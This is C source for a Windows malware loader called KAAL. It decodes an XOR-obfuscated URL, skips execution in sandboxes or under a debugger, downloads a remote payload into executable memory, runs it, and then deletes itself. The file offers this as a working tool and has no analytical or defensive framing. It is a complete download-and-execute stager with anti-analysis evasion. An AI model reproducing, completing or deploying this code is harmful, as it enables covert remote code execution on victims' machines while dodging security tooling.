// Windows KAAL Bootstrap Loader – 3KB, minimal footprint
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define XOR_KEY 0x77
// Encrypted URLs (will be mutated by compatibility generator)
char enc_url[] = {0x5F, 0x5E, 0x5D, 0x56, 0x41, 0x5E, 0x4F,
                  0x5D, 0x5E, 0x5F, 0x4A, 0x5F, 0x00};
char enc_ua[] = {0x4F, 0x52, 0x57, 0x5E, 0x5F, 0x56, 0x4F, 0x00};

void xor_str(char *s) {
  while (*s)
    *s++ ^= XOR_KEY;
}

// Environment detection – ensures we're not in an automated analysis sandbox
BOOL is_analysis_environment() {
  POINT p1, p2;
  GetCursorPos(&p1);
  Sleep(1000);
  GetCursorPos(&p2);
  if (p1.x == p2.x && p1.y == p2.y)
    return TRUE;
  if (GetTickCount() < 120000)
    return TRUE;
  MEMORYSTATUSEX ms;
  ms.dwLength = sizeof(ms);
  GlobalMemoryStatusEx(&ms);
  if (ms.ullTotalPhys < 2147483648)
    return TRUE;
  return IsDebuggerPresent();
}

void execute_in_memory(BYTE *data, DWORD size) {
  void *exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
  if (exec) {
    memcpy(exec, data, size);
    ((void (*)())exec)();
    VirtualFree(exec, 0, MEM_RELEASE);
  }
}

void WINAPI WinMainCRTStartup() {
  if (is_analysis_environment())
    return;
  xor_str(enc_url);
  xor_str(enc_ua);

  HINTERNET hNet = InternetOpenA(enc_ua, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
  if (hNet) {
    HINTERNET hUrl =
        InternetOpenUrlA(hNet, enc_url, 0, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl) {
      BYTE buf[4096];
      DWORD read;
      DWORD total = 0;
      BYTE *payload = NULL;

      // First pass – get size
      while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0)
        total += read;
      InternetCloseHandle(hUrl);

      // Second pass – download
      hUrl = InternetOpenUrlA(hNet, enc_url, 0, 0, INTERNET_FLAG_RELOAD, 0);
      if (hUrl && total > 0) {
        payload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
        if (payload) {
          DWORD off = 0;
          while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
            memcpy(payload + off, buf, read);
            off += read;
          }
          execute_in_memory(payload, total);
          HeapFree(GetProcessHeap(), 0, payload);
        }
      }
      InternetCloseHandle(hUrl);
    }
    InternetCloseHandle(hNet);
  }

  // Self‑destruct: remove the loader executable
  char cmd[MAX_PATH];
  sprintf(cmd, "cmd.exe /c del /f /q \"%s\"", __argv[0]);
  WinExec(cmd, SW_HIDE);
}
